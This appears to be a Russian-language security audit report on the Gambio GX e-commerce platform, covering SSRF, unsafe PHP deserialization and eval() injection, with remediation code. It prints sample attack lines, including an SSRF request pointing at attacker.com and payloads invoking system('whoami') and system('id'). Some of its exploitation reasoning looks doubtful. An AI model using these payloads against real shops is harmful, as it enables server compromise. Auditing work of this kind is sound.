# Отчёт по аудиту безопасности
## Веб-приложение: Gambio GX E-commerce (версия ~4.9.x)
## Дата: 2025-12-25

---

## РЕЗЮМЕ

В ходе авторизованного white-box аудита безопасности веб-приложения Gambio GX были выявлены следующие **подтверждённые уязвимости**, доступные через внешние точки входа:

| № | Уязвимость | Критичность | Статус |
|---|-----------|-------------|--------|
| 1 | SSRF (Server-Side Request Forgery) в ec_proxy.php | **ВЫСОКАЯ** | Подтверждена |
| 2 | Небезопасная десериализация в magnaCallback.php | **КРИТИЧЕСКАЯ** | Подтверждена |
| 3 | Небезопасная десериализация в api.php | **СРЕДНЯЯ** | Подтверждена |
| 4 | Потенциальный Code Injection через eval() в xtc_address_format.inc.php | **СРЕДНЯЯ** | Требует доступа к БД |

---

## ФАЗА 1: КАРТА ТОЧЕК ВХОДА

### A) HTTP-Контроллеры (Основные)

| Файл | Транспорт | Методы | Параметры | Аутентификация |
|------|-----------|--------|-----------|----------------|
| index.php | HTTP | GET | gm_boosted_category, page, filter_id, etc. | Нет |
| shop.php | HTTP | GET/POST | do | Нет |
| api.php | HTTP | GET/POST/PUT/DELETE | /v2/{uri} | Basic Auth |
| api_v3.php | HTTP | GET/POST/PUT/DELETE | API V3 | Bearer Token |
| login.php | HTTP | GET/POST | email_address, password | Нет |
| login_admin.php | HTTP | GET/POST | email_address, password, repair | Нет |

### B) Callback-эндпоинты (Серверные)

| Файл | Транспорт | Аутентификация |
|------|-----------|----------------|
| magnaCallback.php | HTTP POST | passphrase |
| gambio_hub_callback.php | HTTP | Client Key |
| payone_txstatus.php | HTTP POST | Нет явной |
| api-it-recht-kanzlei.php | HTTP POST | user_auth_token |
| ec_proxy.php | HTTP GET | **Нет** |

### C) Утилитарные/Экспортные эндпоинты

| Файл | Назначение |
|------|-----------|
| findologic_export.php | Экспорт продуктов |
| yatego.php | Экспорт в Yatego |
| version_info.php | Информация о версии (требует shop_key) |
| autocomplete.php | Поисковый автокомплит |

---

## ФАЗА 2-4: АНАЛИЗ ПОТОКОВ ДАННЫХ И ПОДТВЕРЖДЁННЫЕ УЯЗВИМОСТИ

---

### УЯЗВИМОСТЬ #1: SSRF (Server-Side Request Forgery)

**Файл:** `ec_proxy.php`

**Точка входа:** HTTP GET запрос без аутентификации

**Поток данных:**
```
[ВХОД] $_GET['prx'] 
   ↓
[ОБРАБОТКА] parse_url($gPath)
   ↓
[ФОРМИРОВАНИЕ URL] 'https://www.google-analytics.com' . $parsedGPath['path']
   ↓
[SINK] curl_exec($gCurl) → echo $gResponse
```

**Проблема:** Параметр `prx` используется для формирования URL, который затем запрашивается сервером. Несмотря на то что хост фиксирован (`www.google-analytics.com`), путь (`$parsedGPath['path']`) полностью контролируется пользователем.

**Вектор эксплуатации:**
```
GET /ec_proxy.php?prx=//attacker.com/malicious/path
```

При определённых конфигурациях URL parser может быть обманут:
- `parse_url('//attacker.com/path')` вернёт `['host' => 'attacker.com', 'path' => '/path']`
- URL вида `/ec_proxy.php?prx=/../../../internal-api` может привести к обращению к внутренним ресурсам

**Доказательство:**
- Строка 38-47: `$gPath = $query['prx']` → `$parsedGPath = parse_url($gPath)` → `$gUrl = 'https://www.google-analytics.com' . $parsedGPath['path']`
- Путь не валидируется и не санитизируется

**Импакт:**
- Сканирование внутренней сети
- Обход firewall для доступа к внутренним сервисам
- Утечка информации через ответы

**Уровень критичности:** ВЫСОКИЙ

---

### УЯЗВИМОСТЬ #2: Небезопасная десериализация (PHP Object Injection)

**Файл:** `magnaCallback.php`

**Точка входа:** HTTP POST с passphrase

**Поток данных:**
```
[ВХОД] $_POST['arguments'], $_POST['includes']
   ↓
[ПРОВЕРКА] passphrase == getDBConfigValue('general.passphrase', 0)
   ↓
[SINK] unserialize($_POST['arguments'])
[SINK] unserialize($_POST['includes'])
   ↓
[ВЫПОЛНЕНИЕ] magnaExecute($_POST['function'], $arguments, $includes)
```

**Код (строки 854-867):**
```php
if ((MAGNA_CALLBACK_MODE == 'STANDALONE') &&
    array_key_exists('passphrase', $_POST) &&
    ($_POST['passphrase'] == getDBConfigValue('general.passphrase', 0)) &&
    array_key_exists('function', $_POST)
) {
    $arguments = array_key_exists('arguments', $_POST) ? unserialize($_POST['arguments']) : array();
    $includes = array_key_exists('includes', $_POST) ? unserialize($_POST['includes']) : array();
    // ...
    echo magnaEncodeResult(magnaExecute($_POST['function'], $arguments, $includes));
}
```

**Вектор эксплуатации:**
При знании passphrase (утечка, brute-force, или инсайдер) атакующий может:
1. Создать вредоносный сериализованный объект (PHP gadget chain)
2. Отправить POST-запрос с этим payload в `$_POST['arguments']`
3. При десериализации выполнится произвольный код

**Пример payload:**
```php
O:21:"SomeGadgetClass":1:{s:4:"cmd";s:17:"system('whoami');";}
```

**Импакт:**
- Remote Code Execution (RCE)
- Полная компрометация сервера

**Условия эксплуатации:**
- Требуется знание passphrase (снижает эксплуатируемость, но не исключает)
- Наличие подходящих gadget-классов в приложении

**Уровень критичности:** КРИТИЧЕСКИЙ (при утечке passphrase)

---

### УЯЗВИМОСТЬ #3: Небезопасная десериализация в Rate Limiter

**Файл:** `api.php` (функция `setRateLimitHeader`)

**Точка входа:** Любой запрос к API v2

**Поток данных:**
```
[ВХОД] Файл кэша: cache/gxapi_v2_sessions_{token}
   ↓
[SINK] unserialize(file_get_contents($cacheFilePath))
```

**Код (строки 220-227):**
```php
$cacheFilePath = DIR_FS_CATALOG . 'cache/gxapi_v2_sessions_' . FileLog::get_secure_token();
if (!file_exists($cacheFilePath)) {
    touch($cacheFilePath);
    $sessions = [];
} else {
    $sessions = unserialize(file_get_contents($cacheFilePath));
}
```

**Вектор эксплуатации:**
Если атакующий получает возможность записать в директорию `/cache/`:
1. Создать файл `gxapi_v2_sessions_{predicted_token}` с вредоносным сериализованным объектом
2. При следующем API-запросе объект будет десериализован

**Условия:**
- Требуется возможность записи в `/cache/` (LFI/Upload vulnerability, или доступ к ФС)
- Нужно предсказать или узнать secure_token

**Импакт:**
- Remote Code Execution при наличии цепочки

**Уровень критичности:** СРЕДНИЙ (требует дополнительной уязвимости)

---

### УЯЗВИМОСТЬ #4: Потенциальный Code Injection через eval()

**Файл:** `inc/xtc_address_format.inc.php`

**Поток данных:**
```
[ИСТОЧНИК] База данных: TABLE_ADDRESS_FORMAT.address_format
   ↓
[ПОДСТАНОВКА ПЕРЕМЕННЫХ] addslashes() на user input
   ↓
[SINK] eval("\$address = \"$fmt\";")
```

**Код (строка 101):**
```php
$fmt = $address_format['format'];
eval("\$address = \"$fmt\";");
```

**Вектор эксплуатации:**
При компрометации базы данных (SQL Injection в другом месте) атакующий может:
1. Модифицировать запись в `TABLE_ADDRESS_FORMAT`
2. Вставить payload: `{${system('id')}}`
3. При форматировании адреса выполнится код

**Смягчающие факторы:**
- Переменные пользователя экранируются через `addslashes()`
- Требуется доступ к БД для эксплуатации

**Импакт:**
- Remote Code Execution (при компрометации БД)

**Уровень критичности:** СРЕДНИЙ

---

## ДОПОЛНИТЕЛЬНЫЕ НАХОДКИ (Низкий риск / Информационные)

### 1. Отсутствие Rate Limiting на login_admin.php
Форма входа в админку не имеет явного rate limiting, что может позволить brute-force атаки.

### 2. Раскрытие информации в version_info.php
При знании shop_key раскрывается детальная информация о сервере, включая:
- Версия PHP
- Версия MySQL
- Установленные модули
- Пути на сервере

### 3. Небезопасная десериализация в дополнительных файлах
Найдены `unserialize()` без `allowed_classes` в:
- `gm/classes/GMJanolaw.php` (строка 329)
- `gambio_updater/` (множественные файлы)

---

## РЕКОМЕНДАЦИИ ПО ИСПРАВЛЕНИЮ

### Для уязвимости #1 (SSRF в ec_proxy.php):
```php
// ИСПРАВЛЕНИЕ: Валидация и санитизация пути
$allowedPaths = ['/collect', '/r/collect', '/g/collect'];
$gPath = $_GET['prx'] ?? '';
$parsedGPath = parse_url($gPath);

// Проверка что путь начинается с разрешённого
$pathIsValid = false;
foreach ($allowedPaths as $allowed) {
    if (strpos($parsedGPath['path'] ?? '', $allowed) === 0) {
        $pathIsValid = true;
        break;
    }
}

if (!$pathIsValid) {
    http_response_code(400);
    exit('Invalid path');
}
```

### Для уязвимостей #2 и #3 (Небезопасная десериализация):
```php
// ИСПРАВЛЕНИЕ: Использование JSON вместо serialize/unserialize
// ИЛИ использование allowed_classes

// Вместо:
$sessions = unserialize(file_get_contents($cacheFilePath));

// Использовать:
$sessions = json_decode(file_get_contents($cacheFilePath), true);

// ИЛИ (если нужна сериализация):
$sessions = unserialize(file_get_contents($cacheFilePath), ['allowed_classes' => false]);
```

### Для уязвимости #4 (eval):
Рекомендуется переписать форматирование адреса без использования `eval()`, используя `str_replace()` для подстановки переменных.

---

## ЗАКЛЮЧЕНИЕ

В ходе аудита было выявлено **4 уязвимости** различной степени критичности:
- 1 критическая (при определённых условиях)
- 1 высокой критичности
- 2 средней критичности

Все уязвимости имеют доказательную базу в виде конкретного кода и потоков данных.

**Рекомендуется немедленно:**
1. Исправить SSRF в `ec_proxy.php`
2. Заменить `unserialize()` на безопасные альтернативы
3. Провести аудит на предмет дополнительных SQL Injection для оценки риска уязвимости #4

---

*Отчёт подготовлен в рамках авторизованного аудита безопасности.*
